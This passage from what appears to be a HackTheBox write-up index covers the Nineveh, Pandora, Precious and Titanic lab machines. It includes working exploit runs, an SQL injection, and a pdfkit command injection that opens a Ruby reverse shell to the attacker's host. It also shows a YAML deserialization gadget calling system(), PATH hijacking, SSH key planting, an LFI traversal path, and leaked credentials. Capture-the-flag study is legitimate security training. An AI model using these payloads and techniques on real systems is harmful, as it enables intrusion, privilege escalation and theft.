Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n288 packages can be updated.\n207 updates are security updates.\n\n\nYou have mail.\nLast login: Mon Jul  3 00:19:59 2017 from 192.168.0.14\namrois@nineveh:~$ whoami\namrois\n</code></pre> <p>Get the flag</p> <pre><code>amrois@nineveh:~$ cat user.txt\n5ee541c07893cc8693adf3e4ef03f435\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"nineveh/#privilege-escalation","title":"Privilege Escalation","text":"<p>Transfer <code>pspy64</code> to the host and execute it.</p> <p></p> <p><code>chkrootkit</code> is being executed, so searching with <code>searchsploit</code></p> <p></p> <pre><code>Steps to reproduce:\n\n- Put an executable file named 'update' with non-root owner in /tmp (not\nmounted noexec, obviously)\n- Run chkrootkit (as uid 0)\n\nResult: The file /tmp/update will be executed as root, thus effectively\nrooting your box, if malicious content is placed inside the file.\n</code></pre> <pre><code>amrois@nineveh:/tmp$ echo 'chmod +s /bin/bash' &gt; update &amp;&amp; chmod +x update\n</code></pre> <p></p> <pre><code>bash-4.3# whoami                                                                                                    \nroot              \n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"nineveh/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag</p> <pre><code>bash-4.3# cat root.txt                                                                                              \ne5830f7bddc8ce23ad62477805a1e1c4\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"pandora/","title":"Pandora","text":"","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"pandora/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.136\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 18:15 CEST\nNmap scan report for 10.10.11.136\nHost is up (0.041s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)\n|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)\n|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Play | Landing\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nDevice type: general purpose\nRunning: Linux 5.X\nOS CPE: cpe:/o:linux:linux_kernel:5\nOS details: Linux 5.0 - 5.14\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT      ADDRESS\n1   39.83 ms 10.10.14.1\n2   39.97 ms 10.10.11.136\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 24.33 seconds\n</code></pre> <pre><code>$ sudo nmap -sU --top-ports 100 -Pn --open 10.10.11.136\n[sudo] password for kali: \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 18:16 CEST\nNmap scan report for 10.10.11.136\nHost is up (0.041s latency).\nNot shown: 95 closed udp ports (port-unreach)\nPORT     STATE         SERVICE\n161/udp  open          snmp\n\nNmap done: 1 IP address (1 host up) scanned in 98.41 seconds\n</code></pre> <p>Site is about play</p> <p></p> <p>Using <code>snmpwalk</code> to enumerate SNMP, we find credentials.</p> <pre><code>$ snmpwalk -c public -v1 -t 10 10.10.11.136\n</code></pre> <p></p> <p><code>daniel:HotelBabylon23</code></p>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"pandora/#initial-access","title":"Initial Access","text":"<p>Access the machine via <code>ssh</code></p> <pre><code>$ ssh daniel@10.10.11.136\ndaniel@10.10.11.136's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\n\n...\n\ndaniel@pandora:~$ whoami\ndaniel\n</code></pre> <p>Looking at Apache sites</p> <pre><code>daniel@pandora:/var/www/pandora/pandora_console/include$ cat /etc/apache2/sites-enabled/pandora.conf \n&lt;VirtualHost localhost:80&gt;\n  ServerAdmin admin@panda.htb\n  ServerName pandora.panda.htb\n  DocumentRoot /var/www/pandora\n  AssignUserID matt matt\n  &lt;Directory /var/www/pandora&gt;\n    AllowOverride All\n  &lt;/Directory&gt;\n  ErrorLog /var/log/apache2/error.log\n  CustomLog /var/log/apache2/access.log combined\n&lt;/VirtualHost&gt;\n</code></pre> <p>So port forward <code>port 80</code> to our local machine and browse it.</p> <pre><code>$ ssh -L 8888:127.0.0.1:80 daniel@panda.htb\n</code></pre> <p></p> <p>We find https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated that exploits CVE-2021-32099</p> <pre><code>$ python sqlpwn.py -t 127.0.0.1:8888\nURL:  http://127.0.0.1:8888/pandora_console\n[+] Sending Injection Payload\n[+] Requesting Session\n[+] Admin Session Cookie : 8q0ui8evsal456qs5s60jt3hc3\n[+] Sending Payload \n[+] Respose : 200\n[+] Pwned :)\n[+] If you want manual Control : http://127.0.0.1:8888/pandora_console/images/pwn.php?test=\n\nCMD &gt; whoami\nmatt\n</code></pre> <p>Now we can read as <code>matt</code> Pandora's config file</p> <pre><code>CMD &gt; cat /var/www/pandora/pandora_console/include/config.php\n&lt;?php\n// File generated by centos kickstart\n$config[\"dbtype\"] = \"mysql\";\n$config[\"dbname\"]=\"pandora\";\n$config[\"dbuser\"]=\"pandora\";\n$config[\"dbpass\"]=\"PandoraFMSSecurePass2021\";\n$config[\"dbhost\"]=\"localhost\";\n$config[\"homedir\"]=\"/var/www/pandora/pandora_console\";\n$config[\"homeurl\"]=\"/pandora_console\";\nerror_reporting(0); \n$ownDir = dirname(__FILE__) . '/';\ninclude ($ownDir . \"config_process.php\");\n?&gt;\n</code></pre> <pre><code>daniel@pandora:~$ mysql -u pandora -p\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 20\nServer version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]&gt; show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| pandora            |\n+--------------------+\n2 rows in set (0.000 sec)\n\nMariaDB [(none)]&gt; \n</code></pre> <p>There are PHP sessions stored at <code>tsessions_php</code></p> <pre><code>MariaDB [pandora]&gt; select * from tsessions_php;\n+----------------------------+-------------+------------------------------------------------------+\n| id_session                 | last_active | data                                                 |\n+----------------------------+-------------+------------------------------------------------------+\n| 09vao3q1dikuoi1vhcvhcjjbc6 |  1638783555 | id_usuario|s:6:\"daniel\";                             |\n| 0ahul7feb1l9db7ffp8d25sjba |  1638789018 | NULL                                                 |\n| 1p2c0cm9eed4u6npgr1ufdhg3v |  1749572113 | id_usuario|s:6:\"daniel\";                             |\n| 1um23if7s531kqf5da14kf5lvm |  1638792211 | NULL                                                 |\n| 2e25c62vc3odbppmg6pjbf9bum |  1638786129 | NULL                                                 |\n| 346uqacafar8pipuppubqet7ut |  1638540332 | id_usuario|s:6:\"daniel\";                             |\n| 3me2jjab4atfa5f8106iklh4fc |  1638795380 | NULL                                                 |\n| 4f51mju7kcuonuqor3876n8o02 |  1638786842 | NULL                                                 |\n| 4nsbidcmgfoh1gilpv8p5hpi2s |  1638535373 | id_usuario|s:6:\"daniel\";                             |\n| 59qae699l0971h13qmbpqahlls |  1638787305 | NULL                                                 |\n| 5fihkihbip2jioll1a8mcsmp6j |  1638792685 | NULL                                                 |\n| 5i352tsdh7vlohth30ve4o0air |  1638281946 | id_usuario|s:6:\"daniel\";                             |\n| 69gbnjrc2q42e8aqahb1l2s68n |  1641195617 | id_usuario|s:6:\"daniel\";                             |\n| 81f3uet7p3esgiq02d4cjj48rc |  1623957150 | NULL                                                 |\n| 8m2e6h8gmphj79r9pq497vpdre |  1638446321 | id_usuario|s:6:\"daniel\";                             |\n| 8q0ui8evsal456qs5s60jt3hc3 |  1749578577 | id_usuario|s:5:\"admin\";alert_msg|a:0:{}new_chat|b:0; |\n| 8upeameujo9nhki3ps0fu32cgd |  1638787267 | NULL                                                 |\n| 9vv4godmdam3vsq8pu78b52em9 |  1638881787 | id_usuario|s:6:\"daniel\";                             |\n| a3a49kc938u7od6e6mlip1ej80 |  1638795315 | NULL                                                 |\n| agfdiriggbt86ep71uvm1jbo3f |  1638881664 | id_usuario|s:6:\"daniel\";                             |\n| cojb6rgubs18ipb35b3f6hf0vp |  1638787213 | NULL                                                 |\n| d0carbrks2lvmb90ergj7jv6po |  1638786277 | NULL                                                 |\n| f0qisbrojp785v1dmm8cu1vkaj |  1641200284 | id_usuario|s:6:\"daniel\";                             |\n| fikt9p6i78no7aofn74rr71m85 |  1638786504 | NULL                                                 |\n| fqd96rcv4ecuqs409n5qsleufi |  1638786762 | NULL                                                 |\n| g0kteepqaj1oep6u7msp0u38kv |  1638783230 | id_usuario|s:6:\"daniel\";                             |\n| g4e01qdgk36mfdh90hvcc54umq |  1638796349 | id_usuario|s:4:\"matt\";alert_msg|a:0:{}new_chat|b:0;  |\n| gf40pukfdinc63nm5lkroidde6 |  1638786349 | NULL                                                 |\n| heasjj8c48ikjlvsf1uhonfesv |  1638540345 | NULL                                                 |\n| hsftvg6j5m3vcmut6ln6ig8b0f |  1638168492 | id_usuario|s:6:\"daniel\";                             |\n| jecd4v8f6mlcgn4634ndfl74rd |  1638456173 | id_usuario|s:6:\"daniel\";                             |\n| kp90bu1mlclbaenaljem590ik3 |  1638787808 | NULL                                                 |\n| ne9rt4pkqqd0aqcrr4dacbmaq3 |  1638796348 | NULL                                                 |\n| nhc3tnsv7bckvim3bsh8r3jekc |  1749578186 | NULL                                                 |\n| o3kuq4m5t5mqv01iur63e1di58 |  1638540482 | id_usuario|s:6:\"daniel\";                             |\n| oi2r6rjq9v99qt8q9heu3nulon |  1637667827 | id_usuario|s:6:\"daniel\";                             |\n| pjp312be5p56vke9dnbqmnqeot |  1638168416 | id_usuario|s:6:\"daniel\";                             |\n| qef3kp8hummmlqf0omrv8bbv5d |  1749578204 | id_usuario|s:5:\"admin\";alert_msg|a:0:{}new_chat|b:0; |\n| qq8gqbdkn8fks0dv1l9qk6j3q8 |  1638787723 | NULL                                                 |\n| r097jr6k9s7k166vkvaj17na1u |  1638787677 | NULL                                                 |\n| rgku3s5dj4mbr85tiefv53tdoa |  1638889082 | id_usuario|s:6:\"daniel\";                             |\n| u5ktk2bt6ghb7s51lka5qou4r4 |  1638547193 | id_usuario|s:6:\"daniel\";                             |\n| u74bvn6gop4rl21ds325q80j0e |  1638793297 | id_usuario|s:6:\"daniel\";                             |\n+----------------------------+-------------+------------------------------------------------------+\n43 rows in set (0.001 sec)\n</code></pre> <p>In the browser, edit the current one and put the admin one.</p> <p></p> <p>Now that we have an admin session, using this exploit https://github.com/UNICORDev/exploit-CVE-2020-5844 we can get a reverse shell as <code>matt</code>.</p> <pre><code>$ python exploit-CVE-2020-5844.py -t localhost 8888 -p qef3kp8hummmlqf0omrv8bbv5d -s 10.10.1\n\n        _ __,~~~/_        __  ___  _______________  ___  ___\n    ,~~`( )_( )-\\|       / / / / |/ /  _/ ___/ __ \\/ _ \\/ _ \\\n        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /\n_V__v___!_!__!_____V____\\____/_/|_/___/\\___/\\____/_/|_/____/....\n\nUNICORD: Exploit for CVE-2020-5844 (Pandora FMS v7.0NG.742) - Remote Code Execution\nOPTIONS: Reverse Shell Mode\nPHPSESS: qef3kp8hummmlqf0omrv8bbv5d\nLOCALIP: 10.10.14.17:9999\nWARNING: Be sure to start a local listener on the above IP and port.\nWEBSITE: http://localhost:8888/pandora_console\nEXPLOIT: Connected to website! Status Code: 200\nEXPLOIT: Logged into Pandora FMS!\nSUCCESS: Reverse shell executed! Check your local listener on 10.10.14.17:9999\n</code></pre> <pre><code>$ rlwrap nc -lnvp 9999\nlistening on [any] 9999 ...\nconnect to [10.10.14.17] from (UNKNOWN) [10.10.11.136] 52538\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami\nmatt\n</code></pre> <p>Get the flag</p> <pre><code>matt@pandora:/home/matt$ cat user.txt\ncat user.txt\nc7ee500896b573bd5fbfdf18f4f4d2f6\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"pandora/#privilege-escalation","title":"Privilege Escalation","text":"<p>Enumerating SUID binaries, the one interesting is <code>pandora_backup</code>.</p> <pre><code>matt@pandora:/home/matt$ find / -perm -u=s -type f 2&gt;/dev/null\nfind / -perm -u=s -type f 2&gt;/dev/null\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/pandora_backup\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/at\n/usr/bin/fusermount\n/usr/bin/chsh\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/policykit-1/polkit-agent-helper-1\n</code></pre> <p>Using <code>strings</code> we see that <code>tar</code> is using a wildcard.</p> <p></p> <p>The script fails with permission denied; it seems this shell is not valid.</p> <p>Generate a private key and put it inside <code>matt</code>'s <code>.ssh</code> folder.</p> <pre><code>matt@pandora:/home/matt/.ssh$ echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPpq+RmAIzEEXxkHuxX6zq9ZW46HG/z9DVBlgyhali@kali\" &gt; authorized_keys\n&lt;9ZW46HG/z9DVBlgyhYhhF7 kali@kali\" &gt; authorized_keys\nmatt@pandora:/home/matt/.ssh$ chmod 600  authorized_keys\nchmod 600  authorized_keys\n</code></pre> <pre><code>$ ssh matt@10.10.11.136 -i id_rsa \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\n\n ...\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\nmatt@pandora:~$ \n</code></pre> <p>Now the script works.</p> <p>Inspecting the script with <code>ltrace</code> we can see that the <code>tar</code> executable is being called relatively.</p> <pre><code>matt@pandora:/var/www/pandora/pandora_console$ ltrace /usr/bin/pandora_backup\ngetuid()                                                              = 1000\ngeteuid()                                                             = 1000\nsetreuid(1000, 1000)                                                  = 0\nputs(\"PandoraFMS Backup Utility\"PandoraFMS Backup Utility\n)                                     = 26\nputs(\"Now attempting to backup Pandora\"...Now attempting to backup PandoraFMS client\n)                           = 43\nsystem(\"tar -cvf /root/.backup/pandora-b\"...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied\ntar: Error is not recoverable: exiting now\n &lt;no return ...&gt;\n--- SIGCHLD (Child exited) ---\n&lt;... system resumed&gt; )                                                = 512\nputs(\"Backup failed!\\nCheck your permis\"...Backup failed!\nCheck your permissions!\n)                          = 39\n+++ exited (status 1) +++\n</code></pre> <p>So we can hijack the binary.</p> <p>Create a <code>tar</code> file in the home directory</p> <pre><code>matt@pandora:~$ echo 'chmod +s /bin/bash' &gt; tar &amp;&amp; chmod +x tar\n</code></pre> <pre><code>matt@pandora:~$ /usr/bin/pandora_backup\nPandoraFMS Backup Utility\nNow attempting to backup PandoraFMS client\nBackup successful!\nTerminating program!\nmatt@pandora:~$ ls -alh /bin/bash\n-rwsr-sr-x 1 root root 1.2M Jun 18  2020 /bin/bash\nmatt@pandora:~$ bash -p\nbash-5.0# whoami\nroot\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"pandora/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag</p> <pre><code>bash-5.0# cat /root/root.txt\n1f87f9d4be6b63f2f7d61f0bb70d2539\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"precious/","title":"Precious","text":"","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"precious/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.189\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-07 08:45 CEST\nNmap scan report for 10.10.11.189\nHost is up (0.042s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)\n|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)\n|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)\n80/tcp open  http    nginx 1.18.0\n|_http-title: Did not follow redirect to http://precious.htb/\n|_http-server-header: nginx/1.18.0\nDevice type: general purpose\nRunning: Linux 5.X\nOS CPE: cpe:/o:linux:linux_kernel:5\nOS details: Linux 5.0 - 5.14\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT      ADDRESS\n1   40.71 ms 10.10.14.1\n2   41.06 ms 10.10.11.189\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 24.40 seconds\n</code></pre> <p>Add <code>precious.htb</code> to <code>/etc/hosts</code> and rescan:</p> <pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open precious.htb\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-07 13:47 CEST\nNmap scan report for precious.htb (10.10.11.189)\nHost is up (0.042s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)\n|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)\n|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)\n80/tcp open  http    nginx 1.18.0\n|_http-title: Convert Web Page to PDF\n| http-server-header: \n|   nginx/1.18.0\n|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15\nDevice type: general purpose\nRunning: Linux 5.X\nOS CPE: cpe:/o:linux:linux_kernel:5.0\nOS details: Linux 5.0, Linux 5.0 - 5.14\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT      ADDRESS\n1   40.12 ms 10.10.14.1\n2   40.32 ms 10.10.11.189\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 20.64 seconds\n</code></pre> <p>Now it says Phusion Passenger, which uses <code>ruby</code>.</p> <p></p> <p>It seems like a tool that receives a web page and gives us the PDF version. Testing it, we got a PDF.</p>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"precious/#initial-access","title":"Initial Access","text":"<p>Using <code>exiftool</code>:</p> <pre><code>$ exiftool rgcanyb3vu0caawurc2uwjd69yt5jn5m.pdf \nExifTool Version Number         : 13.10\nFile Name                       : rgcanyb3vu0caawurc2uwjd69yt5jn5m.pdf\nDirectory                       : .\nFile Size                       : 4.6 kB\nFile Modification Date/Time     : 2025:05:07 13:41:07+02:00\nFile Access Date/Time           : 2025:05:07 13:41:07+02:00\nFile Inode Change Date/Time     : 2025:05:07 15:57:50+02:00\nFile Permissions                : -rw-rw-r--\nFile Type                       : PDF\nFile Type Extension             : pdf\nMIME Type                       : application/pdf\nPDF Version                     : 1.4\nLinearized                      : No\nPage Count                      : 1\nCreator                         : Generated by pdfkit v0.8.6\n</code></pre> <p>So the PDF software is <code>pdfkit</code> v0.8.6. Using <code>searchsploit</code>:</p> <pre><code>$ searchsploit pdfkit\n--------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                       |  Path\n--------------------------------------------------------------------- ---------------------------------\npdfkit v0.8.7.2 - Command Injection                                  | ruby/local/51293.py\n--------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n</code></pre> <p></p> <p>So, adding <code>?name=%20</code>sleep 5<code>\" -</code> to the URL, we can inject a command. Let's use the already made script.</p> <pre><code>$ python 51293.py -s 10.10.14.13 80 -w http://precious.htb -p url\n\n        _ __,~~~/_        __  ___  _______________  ___  ___\n    ,~~`( )_( )-\\|       / / / / |/ /  _/ ___/ __ \\/ _ \\/ _ \\\n        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /\n_V__v___!_!__!_____V____\\____/_/|_/___/\\___/\\____/_/|_/____/....\n\nUNICORD: Exploit for CVE-2022\u201325765 (pdfkit) - Command Injection\nOPTIONS: Reverse Shell Sent to Target Website Mode\nPAYLOAD: http://%20`ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=&gt;TCPSocket.new(\"10.10.14.13\",\"80\"))'`\nLOCALIP: 10.10.14.13:80\nWARNING: Be sure to start a local listener on the above IP and port. \"nc -lnvp 80\".\nWEBSITE: http://precious.htb\nPOSTARG: url\nEXPLOIT: Payload sent to website!\nSUCCESS: Exploit performed action.\n</code></pre> <p>Start a listener with <code>nc</code>:</p> <pre><code>$ sudo rlwrap nc -lnvp 80\n[sudo] password for kali: \nlistening on [any] 80 ...\nconnect to [10.10.14.13] from (UNKNOWN) [10.10.11.189] 60590\nwhoami\nruby\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"precious/#privilege-escalation","title":"Privilege Escalation","text":"<p>Inside the home folder, we find:</p> <pre><code>ruby@precious:~/.bundle$ cat config\ncat config\n---\nBUNDLE_HTTPS://RUBYGEMS__ORG/: \"henry:Q3c1AqGHtoI0aXAYFH\"\n</code></pre> <p>Enter via <code>ssh</code> to have a better terminal and get the flag.</p> <pre><code>henry@precious:~$ cat user.txt\ncat user.txt\n8c5dfcdde2b268f08f1e93f81bbf74bb\n</code></pre> <p><code>henry</code> can execute as <code>sudo</code> a <code>ruby</code> script to update dependencies:</p> <pre><code>henry@precious:~$ sudo -l\nsudo -l\nMatching Defaults entries for henry on precious:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser henry may run the following commands on precious:\n    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb\n</code></pre> <pre><code>henry@precious:~$ cat /opt/update_dependencies.rb\ncat /opt/update_dependencies.rb\n# Compare installed dependencies with those specified in \"dependencies.yml\"\nrequire \"yaml\"\nrequire 'rubygems'\n\n# TODO: update versions automatically\ndef update_gems()\nend\n\ndef list_from_file\n    YAML.load(File.read(\"dependencies.yml\"))\nend\n\ndef list_local_gems\n    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}\nend\n\ngems_file = list_from_file\ngems_local = list_local_gems\n\ngems_file.each do |file_name, file_version|\n    gems_local.each do |local_name, local_version|\n        if(file_name == local_name)\n            if(file_version != local_version)\n                puts \"Installed version differs from the one specified in file: \" + local_name\n            else\n                puts \"Installed version is equals to the one specified in file: \" + local_name\n            end\n        end\n    end\nend\n</code></pre> <pre><code>henry@precious:/opt$ cat sample/dependencies.yml\ncat sample/dependencies.yml\nyaml: 0.1.1\npdfkit: 0.8.6\n</code></pre> <p>Searching, we found a Ruby YAML load vulnerability when loading a yml file, so change the yml to give the suid bit to <code>/bin/bash</code>:</p> <pre><code>---\n- !ruby/object:Gem::Installer\n    i: x\n- !ruby/object:Gem::SpecFetcher\n    i: y\n- !ruby/object:Gem::Requirement\n  requirements:\n    !ruby/object:Gem::Package::TarReader\n    io: &amp;1 !ruby/object:Net::BufferedIO\n      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry\n         read: 0\n         header: \"abc\"\n      debug_output: &amp;1 !ruby/object:Net::WriteAdapter\n         socket: &amp;1 !ruby/object:Gem::RequestSet\n             sets: !ruby/object:Net::WriteAdapter\n                 socket: !ruby/module 'Kernel'\n                 method_id: :system\n             git_set: chmod +s /bin/bash\n         method_id: :resolve\n</code></pre> <p></p> <p>Switch to <code>root</code>:</p> <pre><code>henry@precious:~$ /bin/bash -p\nbash-5.1# whoami\nroot\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"precious/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag:</p> <pre><code>bash-5.1# cat root.txt\n3e38cedfe78832fffb4d9068f474e229\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"titanic/","title":"Titanic","text":"","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"titanic/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.55\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 23:39 CEST\nNmap scan report for 10.10.11.55\nHost is up (0.041s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)\n|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)\n80/tcp open  http    Apache httpd 2.4.52\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n|_http-title: Did not follow redirect to http://titanic.htb/\nAggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 5.0 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT      ADDRESS\n1   41.22 ms 10.10.14.1\n2   41.60 ms 10.10.11.55\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 27.31 seconds\n</code></pre> <p>Add <code>titanic.htb</code> to <code>/etc/hosts</code>.</p> <p>The site shows a service to book Titanic trips.</p> <p></p> <p>Use <code>wfuzz</code> to enumerate subdomains and find <code>dev</code>.</p> <pre><code>$ wfuzz -c -t 200 --hh 154 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.titanic.htb\" http://titanic.htb\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://titanic.htb/\nTotal requests: 114441\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                               \n=====================================================================\n000000019:   200        275 L    1278 W     13870 Ch    \"dev\"                                 \n</code></pre> <p>Add <code>dev.titanic.htb</code> to <code>/etc/hosts</code> and browse the site.</p> <p></p> <p>It's a Gitea instance in which we can register.</p> <p>Log in with the new account and check the repos to find some data.</p> <p>The Docker Compose for <code>MySQL</code> with credentials, another one for Gitea, and the app code from before.</p> <p></p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"titanic/#initial-access","title":"Initial Access","text":"<p>We can see at the <code>/download</code> endpoint that there is no path traversal protection, so we can make a request and perform an LFI attack pointing to the Gitea database at <code>/home/developer/gitea/data/gitea/gitea.db</code> as seen in the Docker Compose and the Gitea docs (<code>gitea/gitea.db</code>). <code>/download?ticket=../../../../../../../home/developer/gitea/data/gitea/gitea.db</code></p> <p></p> <p>The hash and salt are in hex format; we need them in <code>base64</code> to feed them to hashcat as seen here:</p> <p></p> <p>hash: <code>e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56</code> salt: <code>8bf3e3452b78544f8bee9400d6936d34</code></p> <p>Use <code>xxd</code> to convert it from hex to binary and then <code>base64</code> to encode it.</p> <pre><code>$ echo 'e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56' | xxd -p -r | 